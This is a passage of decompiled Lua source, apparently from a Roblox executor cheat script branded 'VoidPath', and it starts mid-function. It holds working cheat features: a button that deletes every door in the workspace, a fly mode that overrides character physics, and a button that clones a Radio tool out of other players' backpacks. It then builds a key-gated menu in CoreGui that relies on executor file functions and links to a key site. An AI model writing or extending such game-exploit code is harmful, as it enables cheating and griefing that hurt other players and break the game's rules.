            vu287:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end
    end)
    v48:CreateButton({
        Name = 'Delete all doors',
        Callback = function()
            local v289, v290, v291 = pairs(workspace:GetDescendants())

            while true do
                local v292

                v291, v292 = v289(v290, v291)

                if v291 == nil then
                    break
                end
                if (v292:IsA('BasePart') or v292:IsA('Model')) and string.lower(v292.Name):find('door') then
                    v292:Destroy()
                end
            end
        end,
    })

    local vu293 = false
    local vu294 = 40
    local vu295 = nil

    v47:CreateToggle({
        Name = 'Fly',
        CurrentValue = false,
        Flag = 'FlyToggle',
        Callback = function(p296)
            vu293 = p296

            local v297 = vu40.Character or vu40.CharacterAdded:Wait()
            local v298 = v297:FindFirstChildOfClass('Humanoid')
            local vu299 = v297:FindFirstChild('HumanoidRootPart')

            if v298 and vu299 then
                if vu293 then
                    v298.PlatformStand = true
                    vu295 = vu36.RenderStepped:Connect(function()
                        local v300 = Vector3.zero

                        if vu37:IsKeyDown(Enum.KeyCode.W) then
                            v300 = v300 + vu39.CFrame.LookVector
                        end
                        if vu37:IsKeyDown(Enum.KeyCode.S) then
                            v300 = v300 - vu39.CFrame.LookVector
                        end
                        if vu37:IsKeyDown(Enum.KeyCode.A) then
                            v300 = v300 - vu39.CFrame.RightVector
                        end
                        if vu37:IsKeyDown(Enum.KeyCode.D) then
                            v300 = v300 + vu39.CFrame.RightVector
                        end
                        if vu37:IsKeyDown(Enum.KeyCode.Space) then
                            v300 = v300 + vu39.CFrame.UpVector
                        end
                        if vu37:IsKeyDown(Enum.KeyCode.LeftControl) then
                            v300 = v300 - vu39.CFrame.UpVector
                        end
                        if v300.Magnitude <= 0 then
                            vu299.Velocity = Vector3.zero
                        else
                            vu299.Velocity = v300.Unit * vu294
                        end
                    end)
                else
                    if vu295 then
                        vu295:Disconnect()
                    end

                    v298.PlatformStand = false
                    vu299.Velocity = Vector3.zero
                end
            else
                vu33:Notify({
                    Title = 'Fly Error',
                    Content = 'Humanoid or HRP not found.',
                    Duration = 5,
                })
            end
        end,
    })
    v47:CreateSlider({
        Name = 'Fly Speed',
        Range = {
            20,
            100
        },
        Increment = 5,
        CurrentValue = vu294,
        Flag = 'FlySpeed',
        Callback = function(p301)
            vu294 = p301
        end,
    })
    v48:CreateButton({
        Name = 'Give Radio',
        Callback = function()
            local vu302 = game:GetService('Players')
            local vu303 = vu302.LocalPlayer
            local vu304 = 'Radio'
            local v319 = (function()
                local v305 = ipairs
                local v306 = {}
                local v307 = vu303

                __set_list(v306, 1, {
                    game:GetService('ReplicatedStorage'),
                    game:GetService('Workspace'),
                    game:GetService('StarterPack'),
                    game:GetService('ServerStorage'),
                    v307:FindFirstChild('StarterGear'),
                })

                local v308, v309, v310 = v305(v306)

                while true do
                    local v311

                    v310, v311 = v308(v309, v310)

                    if v310 == nil then
                        break
                    end
                    if v311 then
                        local v312 = v311:FindFirstChild(vu304)

                        if v312 and v312:IsA('Tool') then
                            return v312
                        end
                    end
                end

                local v313 = vu302
                local v314, v315, v316 = pairs(v313:GetPlayers())

                while true do
                    local v317

                    v316, v317 = v314(v315, v316)

                    if v316 == nil then
                        break
                    end
                    if v317 ~= vu303 and v317:FindFirstChild('Backpack') then
                        local v318 = v317.Backpack:FindFirstChild(vu304)

                        if v318 and v318:IsA('Tool') then
                            return v318
                        end
                    end
                end

                return nil
            end)()

            if v319 then
                v319:Clone().Parent = vu303.Backpack

                vu33:Notify({
                    Title = 'Success',
                    Content = 'Radio added to backpack!',
                    Duration = 3,
                    Image = 4483362458,
                })
            else
                vu33:Notify({
                    Title = 'Error',
                    Content = 'Radio not found in game.',
                    Duration = 3,
                    Image = 4483362458,
                })
            end
        end,
    })
end
local function vu323()
    local v321, v322 = pcall(function()
        return vu7
    end)

    return v321 and v322 and (vu9.key and {
        vu9.key,
    } or {}) or {}
end

if isfile and isfile(vu1) then
    local v324 = readfile(vu1)
    local v325 = vu323()

    if table.find(v325, v324) then
        vu320()

        return
    end
    if delfile then
        pcall(delfile, vu1)
    end
end

local vu326 = Instance.new('ScreenGui')

vu326.Name = 'VoidPathKeyUI'
vu326.ResetOnSpawn = false
vu326.IgnoreGuiInset = true
vu326.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
vu326.Parent = game:GetService('CoreGui')

local v327 = Instance.new('Frame', vu326)

v327.Size = UDim2.new(0, 420, 0, 220)
v327.Position = UDim2.new(0.5, - 210, 0.5, - 110)
v327.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
v327.BorderSizePixel = 0
v327.ZIndex = 2
Instance.new('UICorner', v327).CornerRadius = UDim.new(0, 12)

local v328 = Instance.new('TextLabel', v327)

v328.Size = UDim2.new(1, 0, 0, 40)
v328.Position = UDim2.new(0, 0, 0, 0)
v328.BackgroundTransparency = 1
v328.Text = 'VoidPath Key System'
v328.Font = Enum.Font.GothamBold
v328.TextSize = 22
v328.TextColor3 = Color3.fromRGB(242, 243, 243)
v328.ZIndex = 3

local vu329 = Instance.new('TextBox', v327)

vu329.PlaceholderText = 'Enter your key...'
vu329.Size = UDim2.new(0.9, 0, 0, 40)
vu329.Position = UDim2.new(0.05, 0, 0.3, 0)
vu329.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
vu329.TextColor3 = Color3.new(1, 1, 1)
vu329.TextSize = 18
vu329.Font = Enum.Font.Gotham
vu329.BorderSizePixel = 0
vu329.ZIndex = 3
Instance.new('UICorner', vu329).CornerRadius = UDim.new(0, 8)

local vu330 = Instance.new('TextLabel', v327)

vu330.Size = UDim2.new(1, 0, 0, 24)
vu330.Position = UDim2.new(0, 0, 0.55, 0)
vu330.BackgroundTransparency = 1
vu330.Font = Enum.Font.Gotham
vu330.TextSize = 16
vu330.Text = ''
vu330.TextColor3 = Color3.fromRGB(255, 100, 100)
vu330.ZIndex = 3

local v331 = Instance.new('TextButton', v327)

v331.Size = UDim2.new(0.425, 0, 0, 38)
v331.Position = UDim2.new(0.05, 0, 0.72, 0)
v331.Text = 'Submit'
v331.Font = Enum.Font.GothamSemibold
v331.TextSize = 18
v331.TextColor3 = Color3.new(1, 1, 1)
v331.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
v331.BorderSizePixel = 0
v331.ZIndex = 3
Instance.new('UICorner', v331).CornerRadius = UDim.new(0, 8)

local v332 = Instance.new('TextButton', v327)

v332.Size = UDim2.new(0.425, 0, 0, 38)
v332.Position = UDim2.new(0.525, 0, 0.72, 0)
v332.Text = 'Get Key'
v332.Font = Enum.Font.GothamSemibold
v332.TextSize = 18
v332.TextColor3 = Color3.new(1, 1, 1)
v332.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
v332.BorderSizePixel = 0
v332.ZIndex = 3
Instance.new('UICorner', v332).CornerRadius = UDim.new(0, 8)

v331.MouseButton1Click:Connect(function()
    local v333 = vu329.Text:upper()
    local v334 = vu323()

    if table.find(v334, v333) then
        vu330.TextColor3 = Color3.fromRGB(100, 255, 120)
        vu330.Text = 'Valid key! Loading...'

        if writefile then
            writefile(vu1, v333)
        end

        task.wait(1)
        vu326:Destroy()
        vu320()
    else
        vu330.TextColor3 = Color3.fromRGB(255, 80, 80)
        vu330.Text = 'Invalid key. Try again.'

        if delfile then
            pcall(delfile, vu1)
        end
    end
end)
v332.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard('https://www.voidpath.pro/')

        vu330.TextColor3 = Color3.fromRGB(242, 243, 243)
        vu330.Text = 'Link copied to clipboard!'
    else
        vu330.TextColor3 = Color3.fromRGB(255, 80, 80)
        vu330.Text = 'Clipboard not supported on this executor.'
    end
end)